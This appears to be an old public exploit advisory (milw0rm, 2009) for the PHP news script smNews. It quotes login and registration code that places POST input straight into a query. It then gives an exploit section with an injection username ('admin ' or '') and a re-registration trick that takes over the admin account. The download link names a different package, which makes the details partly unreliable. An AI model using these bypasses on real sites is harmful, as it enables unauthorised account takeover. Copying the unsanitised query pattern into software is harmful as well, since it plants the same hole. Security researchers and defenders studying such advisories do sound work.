@@ -1,0 +1,37 @@
+#########################################################################################
+[0x01] Informations:
+Name           : smNews
+Download       : http://downloads.sourceforge.net/simplequizz/simpleQuizz.zip?modtime=1229788692&big_mirror=0
+Vulnerability  : Auth Bypass/Column Truncation
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian //
+Greetz         : Str0ke,
+#########################################################################################
+[0x02] Bug:
+Bugged file is /[path]/smNews/login.php [...] register.php
+[code]
+  $results = execute('select',
+        array('table' => 'users',
+       'where' => array('username =~ ^'.$_POST['username'].'$', 'and', 'password = '.md5($_POST['password'])),
+       'limit' => array(0,0)));
+[/code]
+
+[code]
+  execute('insert',
+    array('table' => 'users',
+          'values' => array('username' => $_POST['username'],
+                            'password' => md5($_POST['password']),
+                            'email'    => $_POST['email'])));
+[/code]
+#########################################################################################
+[0x03] Exploit:
+Exploit: 1- Username: admin ' or '
+            Password: x0r
+      2- You have only to re-reg the admin.. ex: (if admin nick is 'lol' you reg an
+      account with your passwd, email and nick 'lol' ^^ easy :P
+########################################################################################
+
+EOF
+
+# milw0rm.com [2009-02-18]
